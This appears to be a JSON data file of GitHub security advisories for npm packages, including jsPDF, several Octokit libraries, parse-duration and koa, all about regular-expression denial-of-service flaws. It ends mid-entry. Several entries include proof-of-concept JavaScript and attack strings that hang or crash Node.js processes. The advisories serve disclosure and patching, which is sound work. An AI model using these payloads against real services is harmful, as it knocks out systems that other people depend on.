[
   {
      "package": {
         "raw": "@mozilla/readability@0.5.0",
         "name": "readability",
         "version": "0.5.0",
         "scope": "mozilla"
      },
      "id": "GHSA-3p6v-hrg8-8qj7",
      "description": "Specially crafted titles may have caused a regular expression to excessively backtrack and cause a local denial of service.\n\nAdditional Details are [available at Bugzilla](https://bugzilla.mozilla.org/show_bug.cgi?id=1948833)\n\nCredit: DayShift",
      "summary": "@mozilla/readability Denial of Service through Regex",
      "date": "2025-03-26T14:08:48Z",
      "cve": "CVE-2025-2792",
      "year": 2025
   },
   {
      "package": {
         "raw": "jspdf@3.0.0",
         "name": "jspdf",
         "version": "3.0.0"
      },
      "id": "GHSA-w532-jxjh-hjhj",
      "description": "### Impact\nUser control of the first argument of the `addImage` method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image urls to the `addImage` method, a user can provide a harmful data-url that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`, `addSvgAsImage`.\n\nExample payload:\n```js\nimport { jsPDF } from \"jpsdf\" \n\nconst doc = new jsPDF();\nconst payload = 'data:/charset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=scharset=s\\x00base64,undefined';\n\nconst startTime = performance.now()\n\ntry {\n doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} catch (err) {\n  const endTime = performance.now()\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`)\n}\n\ndoc.save(\"a4.pdf\");\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.1. Upgrade to jspdf@>=3.0.1\n\n### Workarounds\nSanitize image urls before passing it to the `addImage` method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
      "summary": "jsPDF Bypass Regular Expression Denial of Service (ReDoS)",
      "date": "2025-03-18T21:07:47Z",
      "cve": "CVE-2025-29907",
      "year": 2025
   },
   {
      "package": {
         "raw": "uptime-kuma@2.0.0-dev.0",
         "name": "uptime-kuma",
         "version": "2.0.0-dev.0"
      },
      "id": "GHSA-3rw8-4xrq-3f7p",
      "description": "Uptime Kuma >== 1.23.0 has a ReDoS vulnerability, specifically when an administrator creates a notification through the web service. If a string is provided it triggers catastrophic backtracking in the regular expression, leading to a ReDoS attack.",
      "summary": "Uptime Kuma ReDoS vulnerability",
      "date": "2025-03-17T21:30:34Z",
      "cve": "CVE-2025-26042",
      "year": 2025
   },
   {
      "package": {
         "raw": "@babel/helpers@7.26.9",
         "name": "helpers",
         "version": "7.26.9",
         "scope": "babel"
      },
      "id": "GHSA-968p-4wvh-cqc8",
      "description": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
      "summary": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
      "date": "2025-03-11T20:30:18Z",
      "cve": "CVE-2025-27789",
      "year": 2025
   },
   {
      "package": {
         "raw": "@octokit/request@9.2.0",
         "name": "request",
         "version": "9.2.0",
         "scope": "octokit"
      },
      "id": "GHSA-rmvr-2pp2-xj38",
      "description": "### Summary\nThe regular expression `/<([^>]+)>; rel=\"deprecation\"/` used to match the `link` header in HTTP responses is vulnerable to a ReDoS (Regular Expression Denial of Service) attack. This vulnerability arises due to the unbounded nature of the regex's matching behavior, which can lead to catastrophic backtracking when processing specially crafted input. An attacker could exploit this flaw by sending a malicious `link` header, resulting in excessive CPU usage and potentially causing the server to become unresponsive, impacting service availability.\n### Details\nThe vulnerability resides in the regular expression `/<([^>]+)>; rel=\"deprecation\"/`, which is used to match the `link` header in HTTP responses. This regular expression captures content between angle brackets (`<>`) followed by `; rel=\"deprecation\"`. However, the pattern is vulnerable to ReDoS (Regular Expression Denial of Service) attacks due to its susceptibility to catastrophic backtracking when processing malicious input.\nAn attacker can exploit this vulnerability by sending a specially crafted `link` header designed to trigger excessive backtracking. For example, the following headers:\n```js\nfakeHeaders.set(\"link\", \"<\".repeat(100000) + \">\");\nfakeHeaders.set(\"deprecation\", \"true\");\n```\nThe crafted `link` header consists of 100,000 consecutive `<` characters followed by a closing `>`. This input forces the regular expression engine to backtrack extensively in an attempt to match the pattern. As a result, the server can experience a significant increase in CPU usage, which may lead to denial of service, making the server unresponsive or even causing it to crash under load.\nThe issue is present in the following code:\n```js\nconst matches = responseHeaders.link && responseHeaders.link.match(/<([^>]+)>; rel=\"deprecation\"/);\n```\nIn this scenario, the `link` header value triggers the regex to perform excessive backtracking, resulting in resource exhaustion and potentially causing the service to become unavailable.\n\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/2afdabf0fc4cb6cfbd3b1d58b6082f6a)\n1. run npm i @octokit/request\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { request } from \"@octokit/request\";\nconst originalFetch = globalThis.fetch;\nglobalThis.fetch = async (url, options) => {\n  const response = await originalFetch(url, options);\n  const fakeHeaders = new Headers(response.headers);\n  fakeHeaders.set(\"link\", \"<\".repeat(100000) + \">\");\n  fakeHeaders.set(\"deprecation\", \"true\");\n  return new Response(response.body, {\n    status: response.status,\n    statusText: response.statusText,\n    headers: fakeHeaders\n  });\n};\nrequest(\"GET /repos/octocat/hello-world\")\n  .then(response => {\n    // console.log(\"[+] Response received:\", response);\n  })\n  .catch(error => {\n    // console.error(\"[-] Error:\", error);\n  });\n// globalThis.fetch = originalFetch;\n```\n### Impact\nThis is a *Denial of Service (DoS) vulnerability* caused by a *ReDoS (Regular Expression Denial of Service)* flaw. The vulnerability allows an attacker to craft a malicious `link` header that exploits the inefficient backtracking behavior of the regular expression used in the code.\nThe primary impact is the potential for *server resource exhaustion*, specifically high CPU usage, which can cause the server to become unresponsive or even crash when processing the malicious request. This affects the availability of the service, leading to downtime or degraded performance.\nThe vulnerability impacts any system that uses this specific regular expression to process `link` headers in HTTP responses. This can include:\n* Web applications or APIs that rely on parsing headers for deprecation information.\n* Users interacting with the affected service, as they may experience delays or outages if the server becomes overwhelmed.\n* Service providers who may face disruption in operations or performance degradation due to this flaw.\nIf left unpatched, the vulnerability can be exploited by any unauthenticated user who is able to send a specially crafted HTTP request with a malicious `link` header, making it a low-barrier attack that could be exploited by anyone.",
      "summary": "@octokit/request has a Regular Expression in fetchWrapper that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
      "date": "2025-02-14T18:00:18Z",
      "cve": "CVE-2025-25290",
      "year": 2025
   },
   {
      "package": {
         "raw": "@octokit/request-error@5.1.0",
         "name": "request-error",
         "version": "5.1.0",
         "scope": "octokit"
      },
      "id": "GHSA-xx4v-prfh-6cgc",
      "description": "### Summary\nA Regular Expression Denial of Service (ReDoS) vulnerability exists in the processing of HTTP request headers. By sending an authorization header containing an excessively long sequence of spaces followed by a newline and \"@\", an attacker can exploit inefficient regular expression processing, leading to excessive resource consumption. This can significantly degrade server performance or cause a denial-of-service (DoS) condition, impacting availability.\n### Details\nThe issue occurs at [line 52](https://github.com/octokit/request-error.js/blob/main/src/index.ts) of iterator.ts in the @octokit/request-error repository.\nThe vulnerability is caused by the use of an inefficient regular expression in the handling of the `authorization` header within the request processing logic:\n```js\nauthorization: options.request.headers.authorization.replace(\n  / .*$/, \n  \" [REDACTED]\"\n)\n```\nThe regular expression `/ .*$/` matches a space followed by any number of characters until the end of the line. This pattern is vulnerable to Regular Expression Denial of Service (ReDoS) when processing specially crafted input. Specifically, an attacker can send an `authorization` header containing a long sequence of spaces followed by a newline and \"@\", such as:\n```js\nheaders: {\n  authorization: \"\" + \" \".repeat(100000) + \"\\n@\",\n}\n```\nDue to the way JavaScript's regular expression engine backtracks while attempting to match the space followed by arbitrary characters, this input can cause excessive CPU usage, significantly slowing down or even freezing the server. This leads to a denial-of-service condition, impacting availability.\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/e1203ad22701fd043b8501eb37676a0d)\n1. run npm i @octokit/request-error\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { RequestError } from \"@octokit/request-error\";\n\nconst error = new RequestError(\"Oops\", 500, {\n  request: {\n    method: \"POST\",\n    url: \"https://api.github.com/foo\",\n    body: {\n      bar: \"baz\",\n    },\n    headers: {\n      authorization: \"\"+\" \".repeat(100000)+\"\\n@\",\n    },\n  },\n  response: {\n    status: 500,\n    url: \"https://api.github.com/foo\",\n    headers: {\n      \"x-github-request-id\": \"1:2:3:4\",\n    },\n    data: {\n      foo: \"bar\",\n    },\n  },\n});\n```\n\n### Impact\n#### Vulnerability Type & Impact:\nThis is a `Regular Expression Denial of Service (ReDoS) vulnerability`, which occurs due to an inefficient regular expression (`/ .*$/`) used to sanitize the `authorization` header. An attacker can craft a malicious input that triggers excessive backtracking in the regex engine, leading to high CPU consumption and potential denial-of-service (DoS).\n#### Who is Impacted?\n* Projects or services using this code to process HTTP headers are vulnerable.\n* Applications that rely on user-supplied `authorization` headers are at risk, especially those processing a large volume of authentication requests.\n* Multi-tenant or API-driven platforms could experience degraded performance or service outages if exploited at scale.",
      "summary": "@octokit/request-error has a Regular Expression in index that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
      "date": "2025-02-14T17:58:54Z",
      "cve": "CVE-2025-25289",
      "year": 2025
   },
   {
      "package": {
         "raw": "@octokit/plugin-paginate-rest@11.4.0",
         "name": "plugin-paginate-rest",
         "version": "11.4.0",
         "scope": "octokit"
      },
      "id": "GHSA-h5c3-5r3r-rr8q",
      "description": "### Summary\nFor the npm package `@octokit/plugin-paginate-rest`, when calling `octokit.paginate.iterator()`, a specially crafted `octokit` instance—particularly with a malicious `link` parameter in the `headers` section of the `request`—can trigger a ReDoS attack.\n\n### Details\nThe issue occurs at [line 39](https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts) of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:\n```js\nurl = ((normalizedResponse.headers.link || \"\").match(\n  /<([^>]+)>;\\s*rel=\"next\"/,\n) || [])[1];\n```\nThe regular expression `/<([^>]+)>;\\s*rel=\"next\"/` may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted `Link` headers.\n\n### PoC\n[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/d3f2ad000be8384d2105c87c2ed7ce7d)\n1. run npm i @octokit/plugin-paginate-rest\n2. run 'node poc.js'\nresult:\n3. then the program will stuck forever with high CPU usage\n```js\nimport { Octokit } from \"@octokit/core\";\nimport { paginateRest } from \"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) => {\n  const maliciousLinkHeader = \"\" + \"<\".repeat(100000) + \">\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () => {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\n```\n![image](https://github.com/user-attachments/assets/619c030e-5473-4a26-9e2a-4b9a26c1563b)\n\n### Impact\n#### What kind of vulnerability is it?\nThis is a *Regular Expression Denial of Service (ReDoS) vulnerability*, which occurs due to excessive backtracking in the regex pattern:\n```js\n/<([^>]+)>;\\s*rel=\"next\"/\n```\nWhen processing a specially crafted `Link` header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.\n#### Who is impacted?\n* Users of `@octokit/plugin-paginate-rest` who call `octokit.paginate.iterator()` and process untrusted or manipulated `Link` headers.\n* Applications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.\n* GitHub API consumers who integrate this package into their projects for paginated data retrieval.",
      "summary": "@octokit/plugin-paginate-rest has a Regular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
      "date": "2025-02-14T17:57:59Z",
      "cve": "CVE-2025-25288",
      "year": 2025
   },
   {
      "package": {
         "raw": "@octokit/endpoint@9.0.5",
         "name": "endpoint",
         "version": "9.0.5",
         "scope": "octokit"
      },
      "id": "GHSA-x4c5-c7rf-jjgv",
      "description": "### Summary\nBy crafting specific `options` parameters, the `endpoint.parse(options)` call can be triggered, leading to a regular expression denial-of-service (ReDoS) attack. This causes the program to hang and results in high CPU utilization.\n\n### Details\nThe issue occurs in the `parse` function within the `parse.ts` file of the npm package `@octokit/endpoint`. The specific code is located at the following link: https://github.com/octokit/endpoint.js/blob/main/src/parse.ts, at line 62:\n```ts\nheaders.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n```\nThe regular expression `/[\\w-]+(?=-preview)/g` encounters a backtracking issue when it processes `a large number of characters` followed by the `-` symbol.\ne.g., the attack string: \n```js\n\"\" + \"A\".repeat(100000) + \"-\"\n```\n\n### PoC\n[The gist](https://gist.github.com/ShiyuBanzhou/a17202ac1ad403a80ca302466d5e56c4)\nHere is the reproduction process for the vulnerability:\n1. run 'npm i @octokit/endpoint'\n2. Move `poc.js` to the root directory of the same level as `README.md`\n3. run 'node poc.js'\nresult:\n4. then the program will stuck forever with high CPU usage\n```js\nimport { endpoint } from \"@octokit/endpoint\";\n// import { parse } from \"./node_modules/@octokit/endpoint/dist-src/parse.js\";\nconst options = {  \n  method: \"POST\",\n  url: \"/graphql\", // Ensure that the URL ends with \"/graphql\"\n  headers: {\n    accept: \"\" + \"A\".repeat(100000) + \"-\", // Pass in the attack string\n    \"content-type\": \"text/plain\",\n  },\n  mediaType: {\n    previews: [\"test-preview\"], // Ensure that mediaType.previews exists and has values\n    format: \"raw\", // Optional media format\n  },\n  baseUrl: \"https://api.github.com\",\n};\n\nconst startTime = performance.now();\nendpoint.parse(options);\nconst endTime = performance.now();\nconst duration = endTime - startTime;\nconsole.log(`Endpoint execution time: ${duration} ms`);\n```\n1. **Import the `endpoint` module**: First, import the `endpoint` module from the npm package `@octokit/endpoint`, which is used for handling GitHub API requests.\n\n2. **Construct the `options` object that triggers a ReDoS attack**: The following member variables are critical in constructing the `options` object:\n- `url`: Set to `\"/graphql\"`, ensuring the URL ends with `/graphql` to match the format for GitHub's GraphQL API.\n- `headers`:\n> `accept`: A long attack string is crafted with `\"A\".repeat(100000) + \"-\"`, which will be passed to the regular expression and cause a backtracking attack (ReDoS).\n> \n- `mediaType`:\n>`previews`: Set to `[\"test-preview\"]`, ensuring `mediaType.previews` exists and has values.\n>\n>`format`: Set to `\"raw\"`, indicating raw data format.\n\n3. **Call the `endpoint.parse(options)` function and record the time**: Call the `endpoint.parse(options)` function and use `performance.now()` to record the start and end times, measuring the execution duration.\n\n4. **Calculate the time difference and output it**: Compute the difference between the start and end times and output it using `console.log`. When the attack string length reaches 100000, the response time typically exceeds 10000 milliseconds, satisfying the characteristic condition for a ReDoS attack, where response times dramatically increase.\n<img width=\"800\" alt=\"2\" src=\"https://github.com/user-attachments/assets/9fc865a4-e150-42d5-bcd5-93ab6b0c29ef\" />\n\n### Impact\n#### What kind of vulnerability is it?\nThis is a **Regular Expression Denial of Service (ReDoS)** vulnerability. It arises from inefficient regular expressions that can cause excessive backtracking when processing certain inputs. Specifically, the regular expression `/[\\w-]+(?=-preview)/g` is vulnerable because it attempts to match long strings of characters followed by a hyphen (`-`), which leads to inefficient backtracking when provided with specially crafted attack strings. This backtracking results in high CPU utilization, causing the application to become unresponsive and denying service to legitimate users.\n#### Who is impacted?\nThis vulnerability impacts any application that uses the affected regular expression in conjunction with user-controlled inputs, particularly where large or maliciously crafted strings can trigger excessive backtracking.\nIn addition to directly affecting applications using the `@octokit/endpoint package`, the impact is more widespread because `@octokit/endpoint` is a library used to wrap REST APIs, including GitHub's API. This means that any system or service built on top of this library that interacts with GitHub or other REST APIs could be vulnerable. Given the extensive use of this package in API communication, the potential for exploitation is broad and serious. The vulnerability could affect a wide range of applications, from small integrations to large enterprise-level systems, especially those relying on the package to handle API requests.\nAttackers can exploit this vulnerability to cause performance degradation, downtime, and service disruption, making it a critical issue for anyone using the affected version of `@octokit/endpoint`.\n\n### Solution\nTo resolve the ReDoS vulnerability, the regular expression should be updated to avoid excessive backtracking. By modifying the regular expression to `(?<![\\w-])[\\w-]+(?=-preview)`, we prevent the issue.\nHere is how this change solves the problem:\nHere is how this change solves the problem:\n\n1. **Old Regular Expression**: `/[\\w-]+(?=-preview)/g`\n- This regular expression matches any sequence of word characters (`\\w`) and hyphens (`-`) followed by `-preview`.\n- The issue arises when the regex engine encounters a long string of characters followed by a `-`, causing excessive backtracking and high CPU usage.\n2. **New Regular Expression**: `(?<![\\w-])[\\w-]+(?=-preview)`\n- This updated regular expression uses a negative lookbehind `(?<![\\w-])`, ensuring that the matched string is not preceded by any word characters or hyphens (`\\w` or `-`).\n- The new expression still matches sequences of word characters and hyphens, but the negative lookbehind ensures it doesn't cause backtracking issues when processing long attack strings.\n- By adding this lookbehind, we effectively prevent the vulnerability, ensuring the regex operates efficiently without excessive backtracking.\n\n#### Full Solution Example:\nThe specific code is located at the following link: https://github.com/octokit/endpoint.js/blob/main/src/parse.ts, at line 62:\n1. **Update the Regular Expression**: In the `parse.ts` file (or wherever the original regex is defined), replace the existing regular expression:\n```ts\nconst previewsFromAcceptHeader =\n          headers.accept.match(/[\\w-]+(?=-preview)/g) || ([] as string[]);\n```\nWith the updated one:\n```ts\nconst previewsFromAcceptHeader =\n          headers.accept.match(/(?<![\\w-])[\\w-]+(?=-preview)/g) || ([] as string[]);\n```\n\n2. **Test the Change**: After updating the regular expression, thoroughly test the application with both regular and malicious inputs to ensure that:\n- The functionality remains correct and the expected matches still occur.\n- The performance improves and the ReDoS vulnerability no longer occurs when handling large attack strings.\n3. **Deploy the Fix**: Once the solution is verified, deploy the fix to your production environment to protect against potential attacks.",
      "summary": "@octokit/endpoint has a Regular Expression in parse that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
      "date": "2025-02-14T17:56:18Z",
      "cve": "CVE-2025-25285",
      "year": 2025
   },
   {
      "package": {
         "raw": "parse-duration@2.1.2",
         "name": "parse-duration",
         "version": "2.1.2"
      },
      "id": "GHSA-hcrg-fc28-fcg5",
      "description": "### Summary\n\nThis report finds 2 availability issues due to the regex used in the `parse-duration` npm package:\n1. An event loop delay due to the CPU-bound operation of resolving the provided string, from a 0.5ms and up to ~50ms per one operation, with a varying size from 0.01 MB and up to 4.3 MB respectively.\n2. An out of memory that would crash a running Node.js application due to a string size of roughly 10 MB that utilizes unicode characters.\n\n### PoC\n\nRefer to the following proof of concept code that provides a test case and makes use of the regular expression in the library as its test case to match against strings:\n\n```js\n// Vulnerable regex to use from the library:\nimport parse from './index.js'\n\nfunction generateStressTestString(length, decimalProbability) {\n  let result = \"\";\n  for (let i = 0; i < length; i++) {\n    if (Math.random() < decimalProbability) {\n      result += \"....\".repeat(99);\n    }\n    result += Math.floor(Math.random() * 10);\n  }\n  return result;\n}\n\nfunction getStringSizeInMB_UTF8(str) {\n  const sizeInBytes = Buffer.byteLength(str, 'utf8');\n  const sizeInMB = sizeInBytes / (1024 * 1024);\n  return sizeInMB;\n}\n\n\n// Generate test strings with varying length and decimal probability:\nconst longString1 = generateStressTestString(380, 0.05);\nconst longString2 = generateStressTestString(10000, 0.9);\nconst longString3 = generateStressTestString(500000, 1);\nconst longStringVar1 = '-1e' + '-----'.repeat(915000)\nconst longStringVar2 = \"1\" + \"0\".repeat(500) + \"e1\" + \"α\".repeat(5225000)\n\nfunction testRegex(str) {\n  const startTime = performance.now();\n  // one of the regex's used in the library:\n  // const durationRE = /(-?(?:\\d+\\.?\\d*|\\d*\\.?\\d+)(?:e[-+]?\\d+)?)\\s*([\\p{L}]*)/giu;\n  // const match = durationRE.test(str);\n  // but we will use the exported library code directly:\n  const match = parse(str);\n  const endTime = performance.now();\n  const timeTaken = endTime - startTime;\n  return { timeTaken, match };\n}\n\n// Test the long strings:\nlet result = {}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString1.length} (size: ${getStringSizeInMB_UTF8(longString1).toFixed(2)} MB):`\n  );\n  result = testRegex(longString1);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString2.length} (size: ${getStringSizeInMB_UTF8(longString2).toFixed(2)} MB):`\n  );\n  result = testRegex(longString2 + \"....\".repeat(100) + \"5сек\".repeat(9000));\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longStringVar1.length} (size: ${getStringSizeInMB_UTF8(longStringVar1).toFixed(2)} MB):`\n  );\n  result = testRegex(longStringVar1);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longString3.length} (size: ${getStringSizeInMB_UTF8(longString3).toFixed(2)} MB):`\n  );\n  result = testRegex(longString3 + '.'.repeat(10000) + \" 5сек\".repeat(9000));\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n\n{\n  console.log(\n    `\\nRegex test on string of length ${longStringVar2.length} (size: ${getStringSizeInMB_UTF8(longStringVar2).toFixed(2)} MB):`\n  );\n  result = testRegex(longStringVar2);\n  console.log(\n    `   matched: ${result.match}, time taken: ${result.timeTaken}ms`\n  );\n}\n```\n\nThe results of this on the cloud machine that I ran this on are as follows:\n\n```sh\n@lirantal ➜ /workspaces/parse-duration (master) $ node redos.js \n\nRegex test on string of length 6320 (size: 0.01 MB):\n   matched: 5997140778.000855, time taken: 0.9271340000000237ms\n\nRegex test on string of length 3561724 (size: 3.40 MB):\n   matched: 0.0006004999999999999, time taken: 728.7693149999999ms\n\nRegex test on string of length 4575003 (size: 4.36 MB):\n   matched: null, time taken: 43.713984999999866ms\n\nRegex test on string of length 198500000 (size: 189.30 MB):\n\n<--- Last few GCs --->\n\n[34339:0x7686430]    14670 ms: Mark-Compact (reduce) 2047.4 (2073.3) -> 2047.4 (2074.3) MB, 1396.70 / 0.01 ms  (+ 0.1 ms in 62 steps since start of marking, biggest step 0.0 ms, walltime since start of marking 1430 ms) (average mu = 0.412, current mu = 0.[34339:0x7686430]    17450 ms: Mark-Compact (reduce) 2048.4 (2074.3) -> 2048.4 (2075.3) MB, 2777.68 / 0.00 ms  (average mu = 0.185, current mu = 0.001) allocation failure; scavenge might not succeed\n\n\n<--- JS stacktrace --->\n\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n----- Native stack trace -----\n\n 1: 0xb8d0a3 node::OOMErrorHandler(char const*, v8::OOMDetails const&) [node]\n 2: 0xf06250 v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [node]\n 3: 0xf06537 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, v8::OOMDetails const&) [node]\n 4: 0x11180d5  [node]\n 5: 0x112ff58 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]\n 6: 0x1106071 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]\n 7: 0x1107205 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]\n 8: 0x10e4856 v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [node]\n 9: 0x1540686 v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [node]\n10: 0x1979ef6  [node]\nAborted (core dumped)\n```\n\nYou can note that:\n1. 0.01 MB of input was enough to cause a 1ms delay (0.92ms)\n2. Ranging from either 3 MB to 4 MB of input results in almost a full second day (728ms) and 42 ms, depending on the characters used in the text passed to the library's `parse()` function\n3. A 200 MB of input size already causes JavaScript heap out of memory crash\n\nHowever, more interestingly, if we focus on the input string case:\n\n```js\nconst longStringVar2 = \"1\" + \"0\".repeat(500) + \"e1\" + \"α\".repeat(5225000)\n```\n\nEven though this is merely 10 MB of size (9.97 MB) it results in an out of memory issue due to the recursive nature of the regular expression matching:\n\n```sh\nRegex test on string of length 5225503 (size: 9.97 MB):\nfile:///workspaces/parse-duration/index.js:21\n    .replace(durationRE, (_, n, units) => {\n     ^\n\nRangeError: Maximum call stack size exceeded\n    at String.replace (<anonymous>)\n    at parse (file:///workspaces/parse-duration/index.js:21:6)\n    at testRegex (file:///workspaces/parse-duration/redos.js:35:17)\n    at file:///workspaces/parse-duration/redos.js:89:12\n    at ModuleJob.run (node:internal/modules/esm/module_job:234:25)\n    at async ModuleLoader.import (node:internal/modules/esm/loader:473:24)\n    at async asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:122:5)\n\nNode.js v20.18.1\n```\n \nTo note, the issue at hand may not just be the primary regex in use but rather the reliance of the various `replace` functions in the `parse()` function which create copies of the input in memory.\n\n### Impact\n\n- I agree, a 200 MB (perhaps even less if we perform more tests to find the actual threshold) is a large amount of data to send over a network and hopefully is unlikely to hit common application usage.\n- In the case of the specialized input string case that uses a UTF-8 character it is only requires up to 10 MB of request size to cause a RangeError exception for a running Node.js application, which I think is more applicable and common to allow such input sizes for POST requests and other types.\n- Even for the smaller payloads such as 0.01 MB which aligns with Express's default of 100kb request limit size it causes a 1ms delay. Now imagine if an application is running without proper security controls such as rate limits, and attackers send 1000s of concurrent requests which quickly turn the 1ms delay into seconds worth of delay for a running application. The 3 MB payload already shows a 0.5s delay in one request.",
      "summary": "parse-duration has a Regex Denial of Service that results in event loop delay and out of memory",
      "date": "2025-02-12T19:45:51Z",
      "cve": "CVE-2025-25283",
      "year": 2025
   },
   {
      "package": {
         "raw": "koa@2.15.3",
         "name": "koa",
         "version": "2.15.3"
      },
      "id": "GHSA-593f-38f6-jp5m",
      "description": "### Summary\nKoa uses an evil regex to parse the `X-Forwarded-Proto` and `X-Forwarded-Host` HTTP headers. This can be exploited to carry out a Denial-of-Service attack.\n\n### PoC\n\nComing soon.\n\n### Impact\nThis is a Regex Denial-of-Service attack and causes memory exhaustion. The regex should be improved and empty values should not be allowed.",
      "summary": "Inefficient Regular Expression Complexity in koa",
      "date": "2025-02-12T19:23:09Z",
      "cve": "CVE-2025-25200",
      "year": 2025
   },
   {
      "package": {
         "raw": "parse-uri@1.0.9",
         "name": "parse-uri",
         "version": "1.0.9"
      },
      "id": "GHSA-6fx8-h7jm-663j",
      "description": "An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.",
      "summary": "parse-uri Regular expression Denial of Service (ReDoS)",
      "date": "2025-01-16T00:31:22Z",
      "cve": "CVE-2024-36751",
      "year": 2024
   },
   {
      "package": {
         "raw": "path-to-regexp@0.1.11",
         "name": "path-to-regexp",
         "version": "0.1.11"
      },
      "id": "GHSA-rhx6-c78j-4q9w",
